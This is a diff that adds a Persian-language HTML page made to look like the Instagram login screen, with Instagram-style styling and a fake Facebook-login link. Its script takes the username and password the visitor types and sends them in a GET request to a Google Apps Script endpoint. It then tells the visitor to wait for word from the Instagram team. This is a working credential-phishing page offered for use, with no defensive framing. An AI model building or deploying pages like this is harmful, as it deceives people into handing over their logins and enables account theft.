@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ورود به instagram</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #fafafa;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            direction: rtl; /* تنظیم جهت‌گیری راست به چپ */
+        }
+        .login-container {
+            width: 100%;
+            max-width: 350px;
+            padding: 20px;
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            text-align: center;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            position: relative;
+        }
+        .login-container h1 {
+            font-family: 'Cookie', cursive;
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+        .login-container input[type="text"],
+        .login-container input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0 10px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            box-sizing: border-box;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #3897f0;
+            color: #fff;
+            border: none;
+            border-radius: 3px;
+            font-size: 16px;
+            cursor: pointer;
+            margin: 10px 0;
+            position: relative;
+        }
+        .login-container button:disabled {
+            background-color: #d1d1d1;
+            cursor: not-allowed;
+        }
+        .login-container button:hover:enabled {
+            background-color: #2a75d6;
+        }
+        .login-container a {
+            color: #3897f0;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .separator {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 20px 0;
+        }
+        .separator::before,
+        .separator::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+        }
+        .separator::before {
+            margin-right: .25em;
+        }
+        .separator::after {
+            margin-left: .25em;
+        }
+        .login-container .facebook-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #3897f0;
+            color: #fff;
+            padding: 10px;
+            border-radius: 3px;
+            text-decoration: none;
+            margin: 10px 0;
+        }
+        .login-container .facebook-login img {
+            margin-left: 8px;
+        }
+
+        /* CSS برای پیغام */
+        .message {
+            display: none;
+            padding: 10px;
+            color: #fff;
+            background-color: #f44336; /* رنگ قرمز برای خطا */
+            position: absolute;
+            width: calc(100% - 20px); /* عرض پیغام */
+            right: 10px; /* جابجایی به سمت راست */
+            text-align: center;
+            transform: translateY(-100%);
+            transition: transform 0.5s ease, opacity 0.5s ease;
+            opacity: 0;
+            z-index: 1;
+            /* حذف حاشیه، گوشه‌ها، و سایه */
+            border: none;
+            border-radius: 0;
+            box-shadow: none;
+            margin: 0; /* حذف فاصله‌های اضافی */
+        }
+        .message.show {
+            display: block;
+            transform: translateY(0);
+            opacity: 1;
+        }
+        .message.success {
+            background-color: #4caf50; /* سبز برای موفقیت */
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h1>instagram</h1>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="شماره تلفن، نام کاربری، یا ایمیل" required>
+            <input type="password" id="password" placeholder="رمز عبور" required>
+            <button type="submit">ورود</button>
+            <div id="message" class="message"></div> <!-- پیغام نمایش -->
+        </form>
+        <a href="#" id="forgotPassword">فراموشی رمز عبور؟</a>
+        <div class="separator">یا</div>
+        <a href="#" class="facebook-login">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" width="20" height="20">
+            ورود با فیس‌بوک
+        </a>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            var button = event.target.querySelector('button');
+            var message = document.getElementById('message');
+            var forgotPassword = document.getElementById('forgotPassword');
+            button.disabled = true; // غیر فعال کردن دکمه
+            button.style.backgroundColor = '#d1d1d1'; // تغییر رنگ دکمه به طوسی
+
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            fetch('https://script.google.com/macros/s/AKfycbx8YXq5WSbxlXFOm3KB5LOdVx3D6a2LBh7k18eZ8eQOFdr710qH3VFNl5z8IzCuHRGC/exec?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password))
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    message.textContent = 'منتظر اطلاع رسانی تیم اینستاگرام باشید';
+                    message.className = 'message success show';
+                } else {
+                    message.textContent = 'خطا در احراز هویت';
+                    message.className = 'message show';
+                    // لرزش گوشی برای خطا (مخصوص موبایل)
+                    if (navigator.vibrate) {
+                        navigator.vibrate([500, 200, 500]); // لرزش با الگوی مشخص
+                    }
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                message.textContent = 'خطا در احراز هویت';
+                message.className = 'message show';
+                // لرزش گوشی برای خطا (مخصوص موبایل)
+                if (navigator.vibrate) {
+                    navigator.vibrate([500, 200, 500]); // لرزش با الگوی مشخص
+                }
+            })
+            .finally(() => {
+                // فعال کردن دوباره دکمه پس از 3 ثانیه
+                setTimeout(() => {
+                    button.disabled = false;
+                    button.style.backgroundColor = '#3897f0'; // برگرداندن رنگ دکمه به حالت اولیه
+                    // مخفی کردن پیغام
+                    message.className = 'message';
+                }, 2000);
+
+                // جابجا کردن فراموشی رمز عبور
+                setTimeout(() => {
+                    forgotPassword.style.marginTop = '70px'; // جابجایی به سمت پایین
+                }, 500); // شروع انیمیشن پیغام بعد از 0.5 ثانیه
+            });
+        });
+    </script>
+</body>
+</html>
